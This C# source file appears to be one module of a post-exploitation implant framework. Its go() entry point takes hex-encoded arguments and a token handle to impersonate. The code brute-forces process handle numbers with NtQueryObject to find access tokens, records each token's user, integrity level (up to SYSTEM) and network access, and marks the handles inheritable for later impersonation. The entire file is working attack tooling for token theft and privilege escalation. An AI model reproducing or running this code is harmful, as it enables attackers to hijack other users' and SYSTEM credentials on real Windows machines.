using System;
using System.IO;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using System.Diagnostics;


public class Module_list_tokens
{
    public const string SUCC_CODE       = "0";
    public const string ERR_CODE        = "1";
    public const string NON_TOKEN_VALUE = "0";
	public const int MAX_TOKEN_VAL      = 1000000;

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    private void ImpersonateWithToken(string token)
    {
        int token_int = Int32.Parse(token);
        IntPtr targetToken = new IntPtr(token_int);

        string current_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            current_username = wid.Name;
        }

        if (!ImpersonateLoggedOnUser(targetToken))
        {
            var errorCode = Marshal.GetLastWin32Error();
            throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
        }

        string impersonate_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            impersonate_username = wid.Name;
        }

        if (current_username == impersonate_username)
            throw new Exception("ImpersonateLoggedOnUser worked, but thread running as user " + current_username);
    }

    private string hex2Str(string hex)
    {
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return Encoding.ASCII.GetString(raw);
    }

    private string normalizePath(string currPath)
    {
        currPath = currPath.Replace("\"", "");
        currPath = currPath.Replace("'", "");
        currPath = currPath.Replace(@"\", "/");
        return currPath;
    }

    private string changeCWD(string cwd)
    {
        try
        {
            Directory.SetCurrentDirectory(cwd);
            return normalizePath(Directory.GetCurrentDirectory());
        }
        catch (Exception ex)
        {
            if (ex is IOException)
                throw new Exception("Path '" + cwd + "' is not a directory");
            else if (ex is DirectoryNotFoundException)
                throw new Exception("Directory '" + cwd + "' does not exist");
            else if (ex is SecurityException)
                throw new Exception("Directory '" + cwd + "' permission denied");
            else if (ex is PathTooLongException)
                throw new Exception("Path '" + cwd + "' exceed the maximum length defined by the system");
            else
                throw new Exception("Move to path '" + cwd + "' failed");
        }
    }

    private string[] parseArguments(string args)
    {
        List<string> arguments_parsed = new List<string>();
        string pattern = @"""[^""]+""|'[^']+'|\S+";
        foreach (Match m in Regex.Matches(args, pattern))
        {
            arguments_parsed.Add(m.Value);
        }
        return arguments_parsed.ToArray();
    }

	public const int NO_ERROR = 0;
	public const int ERROR_INSUFFICIENT_BUFFER = 122;
	public const int HANDLE_FLAG_INHERIT = 0x00000001;
	public const int SE_PRIVILEGE_ENABLED = 0x00000002;
	public const int TOKEN_QUERY = 0x00000008;
	public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
	public const string SE_TIME_ZONE_NAMETEXT = "SeImpersonatePrivilege";

	public const int SECURITY_MANDATORY_UNTRUSTED_RID = (0x00000000);
    public const int SECURITY_MANDATORY_LOW_RID = (0x00001000);
    public const int SECURITY_MANDATORY_MEDIUM_RID = (0x00002000);
    public const int SECURITY_MANDATORY_HIGH_RID = (0x00003000);
    public const int SECURITY_MANDATORY_SYSTEM_RID = (0x00004000);
    public const int SECURITY_MANDATORY_PROTECTED_PROCESS_RID = (0x00005000);
	
	public enum SID_NAME_USE
	{
	    SidTypeUser = 1,
	    SidTypeGroup,
	    SidTypeDomain,
	    SidTypeAlias,
	    SidTypeWellKnownGroup,
	    SidTypeDeletedAccount,
	    SidTypeInvalid,
	    SidTypeUnknown,
	    SidTypeComputer
	}
	
	public enum TOKEN_INFORMATION_CLASS
	{
	    TokenUser = 1,
	    TokenGroups,
	    TokenPrivileges,
	    TokenOwner,
	    TokenPrimaryGroup,
	    TokenDefaultDacl,
	    TokenSource,
	    TokenType,
	    TokenImpersonationLevel,
	    TokenStatistics,
	    TokenRestrictedSids,
	    TokenSessionId,
	    TokenGroupsAndPrivileges,
	    TokenSessionReference,
	    TokenSandBoxInert,
	    TokenAuditPolicy,
	    TokenOrigin,
	    TokenElevationType,
	    TokenLinkedToken,
	    TokenElevation,
	    TokenHasRestrictions,
	    TokenAccessInformation,
	    TokenVirtualizationAllowed,
	    TokenVirtualizationEnabled,
	    TokenIntegrityLevel,
	    TokenUIAccess,
	    TokenMandatoryPolicy,
	    TokenLogonSid,
	    MaxTokenInfoClass
	}
	
	public struct TOKEN_USER
	{
	    public SID_AND_ATTRIBUTES User;
	}
	
	public struct TOKEN_ORIGIN
	{
	    public ulong tokenorigin;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct TOKEN_MANDATORY_LABEL
	{
	    public SID_AND_ATTRIBUTES Label;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SID_AND_ATTRIBUTES
	{
	    public IntPtr Sid;
	    public int Attributes;
	}
	
	public enum OBJECT_INFORMATION_CLASS : int
	{
	    ObjectBasicInformation = 0,
	    ObjectNameInformation = 1,
	    ObjectTypeInformation = 2,
	    ObjectAllTypesInformation = 3,
	    ObjectHandleInformation = 4
	}
	
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct OBJECT_TYPE_INFORMATION
	{
	    public UNICODE_STRING Name;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct UNICODE_STRING
	{
	    public ushort Length;
	    public ushort MaximumLength;
	    public IntPtr Buffer;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
	   public IntPtr hProcess;
	   public IntPtr hThread;
	   public int dwProcessId;
	   public int dwThreadId;
	}
	
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
	     public Int32 cb;
	     public string lpReserved;
	     public string lpDesktop;
	     public string lpTitle;
	     public Int32 dwX;
	     public Int32 dwY;
	     public Int32 dwXSize;
	     public Int32 dwYSize;
	     public Int32 dwXCountChars;
	     public Int32 dwYCountChars;
	     public Int32 dwFillAttribute;
	     public Int32 dwFlags;
	     public Int16 wShowWindow;
	     public Int16 cbReserved2;
	     public IntPtr lpReserved2;
	     public IntPtr hStdInput;
	     public IntPtr hStdOutput;
	     public IntPtr hStdError;
	}
	
	public enum LogonFlags
	{
	     WithProfile = 1,
	     NetCredentialsOnly
	}
	
	public enum CreationFlags
	{
	    NoConsole = 0x08000000
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
	    public int nLength;
	    public IntPtr lpSecurityDescriptor;
	    public int bInheritHandle;
	}
	
	public enum TOKEN_TYPE
	{
	    TokenPrimary = 1,
	    TokenImpersonation
	}
	
	public enum SECURITY_IMPERSONATION_LEVEL
	{
	    SecurityAnonymous,
	    SecurityIdentification,
	    SecurityImpersonation,
	    SecurityDelegation
	}
	
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct TokPriv1Luid
	{
	    public int Count;
	    public long Luid;
	    public int Attr;
	}
	
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool GetTokenInformation(
	    IntPtr TokenHandle,
	    TOKEN_INFORMATION_CLASS TokenInformationClass,
	    IntPtr TokenInformation,
	    int TokenInformationLength,
	    out int ReturnLength);
	
	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public extern static bool DuplicateTokenEx(
	    IntPtr hExistingToken,
	    uint dwDesiredAccess,
	    ref SECURITY_ATTRIBUTES lpTokenAttributes,
	    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
	    TOKEN_TYPE TokenType,
	    out IntPtr phNewToken);
	
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern IntPtr GetSidSubAuthority(IntPtr pSid, int nSubAuthority);
	
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);
	
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr CreatePipe(ref IntPtr hReadPipe, ref IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes,Int32 nSize);
	
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped/*IntPtr.Zero*/);
	
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool SetHandleInformation(IntPtr hObject, int dwMask, int dwFlags);
	
	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
	
	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
	
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool LookupPrivilegeValue(string host, string name,ref long pluid);
	
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
	
	[DllImport("kernel32.dll")]
	public static extern IntPtr GetCurrentProcess();
	
	[DllImport("ntdll.dll")]
	public static extern int NtQueryObject(IntPtr ObjectHandle, int ObjectInformationClass, IntPtr ObjectInformation, int ObjectInformationLength, ref int returnLength);
	
	[DllImport("kernel32.dll")]
	public static extern bool CloseHandle(IntPtr hObject);
	
	[DllImport("kernel32.dll")]
	public static extern bool GetHandleInformation(IntPtr hObject, out uint lpdwFlags);
	
	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern int NtQueryInformationProcess(IntPtr processHandle, uint processInformationClass, IntPtr processInformation, int processInformationLength, ref int returnLength);
	
	[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
	public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
	
	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool LookupAccountSid(
	    [MarshalAs(UnmanagedType.LPTStr)] string strSystemName,
	    IntPtr pSid,
	    System.Text.StringBuilder pName,
	    ref uint cchName,
	    System.Text.StringBuilder pReferencedDomainName,
	    ref uint cchReferencedDomainName,
	    out SID_NAME_USE peUse);

    private string[] doListTokens()
    {
        string result = "Token\tUsername\tNetwork Access\tIntegrityLevel" + Environment.NewLine;
        List<string> user_tokens = new List<string>();
	    int nLength = 0, status = 0;
	    try
	    {
	        for (int index = 1; index < MAX_TOKEN_VAL; index++)
	        {
				string userTokenIntegrityLevel = "";
				string userTokenNetworkAccess  = "";

	            var handle = new IntPtr(index);
	            IntPtr hObjectName = IntPtr.Zero;
	            try
	            {
	                nLength = 0;
	                hObjectName = Marshal.AllocHGlobal(256 * 1024);
	                status = NtQueryObject(handle, (int)OBJECT_INFORMATION_CLASS.ObjectTypeInformation, hObjectName, nLength, ref nLength);
	                if (string.Format("{0:X}", status) == "C0000008")
	                    continue;
	                
	                while (status != 0)
	                {
	                    Marshal.FreeHGlobal(hObjectName);
	                    if (nLength == 0)
	                        continue;
	                    hObjectName = Marshal.AllocHGlobal(nLength);
	                    status = NtQueryObject(handle, (int)OBJECT_INFORMATION_CLASS.ObjectTypeInformation, hObjectName, nLength, ref nLength);
	                }
	                
					OBJECT_TYPE_INFORMATION objObjectName = (OBJECT_TYPE_INFORMATION)Marshal.PtrToStructure(hObjectName, typeof(OBJECT_TYPE_INFORMATION));

	                if (objObjectName.Name.Buffer != IntPtr.Zero)
	                {
	                    string strObjectName = "" + Marshal.PtrToStringUni(objObjectName.Name.Buffer);
	                    if (strObjectName.ToLower() == "token")
	                    {
	                        int tokenInfLen = 0;
	                        bool res;
	                        res = GetTokenInformation(handle, TOKEN_INFORMATION_CLASS.TokenUser, IntPtr.Zero, tokenInfLen, out tokenInfLen);
	                        IntPtr TokenInformation = Marshal.AllocHGlobal(tokenInfLen);
	                        res = GetTokenInformation(handle, TOKEN_INFORMATION_CLASS.TokenUser, TokenInformation, tokenInfLen, out tokenInfLen);
	                        if (res)
	                        {
	                            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
	                            IntPtr pstr = IntPtr.Zero;
	                            StringBuilder name = new StringBuilder();
	                            uint cchName = (uint)name.Capacity;
	                            StringBuilder referencedDomainName = new StringBuilder();
	                            uint cchReferencedDomainName = (uint)referencedDomainName.Capacity;
	                            SID_NAME_USE sidUse;
	                            int err = NO_ERROR;
	                            if (!LookupAccountSid(null, TokenUser.User.Sid, name, ref cchName, referencedDomainName, ref cchReferencedDomainName, out sidUse))
	                            {
	                                err = Marshal.GetLastWin32Error();
	                                if (err == ERROR_INSUFFICIENT_BUFFER)
	                                {
	                                    name.EnsureCapacity((int)cchName);
	                                    referencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
	                                    err = NO_ERROR;
	                                    if (!LookupAccountSid(null, TokenUser.User.Sid, name, ref cchName, referencedDomainName, ref cchReferencedDomainName, out sidUse))
	                                        err = Marshal.GetLastWin32Error();
	                                }
	                            }
	                            if (err == NO_ERROR)
	                            {
	                                var userName = referencedDomainName.ToString().ToLower() + "\\" + name.ToString().ToLower();
	                                IntPtr tokenInformation = Marshal.AllocHGlobal(8);
	                                res = GetTokenInformation(handle, TOKEN_INFORMATION_CLASS.TokenOrigin, tokenInformation, 8, out tokenInfLen);
	                                if (res)
	                                {
	                                    TOKEN_ORIGIN tokenOrigin = (TOKEN_ORIGIN)Marshal.PtrToStructure(tokenInformation, typeof(TOKEN_ORIGIN));
	                                    if (tokenOrigin.tokenorigin != 0)
	                                        userTokenNetworkAccess = "True";
										else
											userTokenNetworkAccess = "False";
	                                }

	                                IntPtr pb = Marshal.AllocCoTaskMem(1000);
	                                try 
	                                {
	                                    int cb = 1000;
	                                    if (GetTokenInformation(handle, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pb, cb, out cb)) 
	                                    {
	                                        IntPtr pSid = Marshal.ReadIntPtr(pb);
	                                        int dwIntegrityLevel = Marshal.ReadInt32(GetSidSubAuthority(pSid, (int)(Marshal.ReadByte(GetSidSubAuthorityCount(pSid)) - 1U)));

											if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
												userTokenIntegrityLevel = "LOW";
											else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
												userTokenIntegrityLevel = "MEDIUM";
											else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
												userTokenIntegrityLevel = "SYSTEM";
											else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
												userTokenIntegrityLevel = "HIGH";
											else
												userTokenIntegrityLevel = "-";
	                                    }
	                                }
	                                finally
	                                {
	                                    Marshal.FreeCoTaskMem(pb);
	                                }
	                                if (!user_tokens.Contains(userName))
	                                {
	                                    SetHandleInformation(
	                                        handle,
	                                        0x00000002,
	                                        0x00000002
	                                        );
	                                    user_tokens.Add(userName);
                                        result += handle.ToInt32().ToString() + "\t" + userName + "\t" + userTokenNetworkAccess + "\t" + userTokenIntegrityLevel + Environment.NewLine;
	                                }
	                            }
	                        }
	                        Marshal.FreeHGlobal(TokenInformation);
	                    }
	                }
	            }
	            catch (Exception){ }
	            finally
	            {
	                Marshal.FreeHGlobal(hObjectName);
	            }	            
	        }
	    }
	    catch (Exception ex)
        {
            result += ex.ToString() + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }
        return new string[]{SUCC_CODE, result};
    }

    public string[] execute(string[] args)
    {
        return doListTokens();
    }

    public string[] go(string cwd, string args, string token)
    {
        string[] results = new string[]{SUCC_CODE, ""};
        string pwd = Directory.GetCurrentDirectory();

        try
        {
            if (token != NON_TOKEN_VALUE)
                ImpersonateWithToken(token);

            string new_cwd = changeCWD(cwd);
            string[] arguments_parsed = parseArguments(hex2Str(args));
            
            results = execute(arguments_parsed);
        }
        catch (Exception ex)
        {
            results[0] = ERR_CODE;
            results[1] = ex.ToString();
        }
        finally
        {
            changeCWD(pwd);
            if (token != NON_TOKEN_VALUE)
                RevertToSelf();
        }
        return results;
    }

    public static void Main(string[] args)
    {
        Module_list_tokens m = new Module_list_tokens();
        String[] results = m.execute(args);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }
}